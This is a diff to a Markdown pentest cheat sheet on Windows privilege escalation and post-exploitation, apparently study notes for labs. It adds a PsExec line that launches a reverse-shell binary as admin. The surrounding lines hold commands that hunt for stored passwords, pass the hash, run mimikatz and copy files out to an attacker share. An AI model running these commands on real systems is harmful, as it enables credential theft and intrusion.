@@ -124,7 +124,10 @@ DMP Files (possible base64 passwords)  - find or create from processes
     dir C:\Users\username\AppData\Local\Microsoft\Credentials\   
     dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\   
     
-    runas /savecred /user:[user name] C:\PrivEsc\reverse.exe
+    runas /savecred /user:[user name] C:\PrivEsc\reverse.exe  
+    
+    PsExec64.exe /accepteula -i -u admin -p password C:\Temp\reverse.exe  
+    
 ### Creds in Registry 
     reg query HKLM /f password /t REG_SZ /s
     reg query HKCU /f password /t REG_SZ /s 
@@ -256,8 +259,8 @@ ____
      pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP  
      xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share   
      \\tsclient\share\mimikatz\x64\mimikatz.exe   
-     psexec 
- ____ 
+
+____ 
  # Post Exploitation / Exfiltration 
  [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
  Enabled WinRm as Administrator to use evil-winrm  
@@ -271,8 +274,6 @@ ____
      copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
 ## Remote Scripts  
 [lsassy](https://github.com/PowerShellMafia/PowerSploit): script to extract creds remotely using impacket  
-
-
 
  ## AV Evasion  
  ### Check for AV  
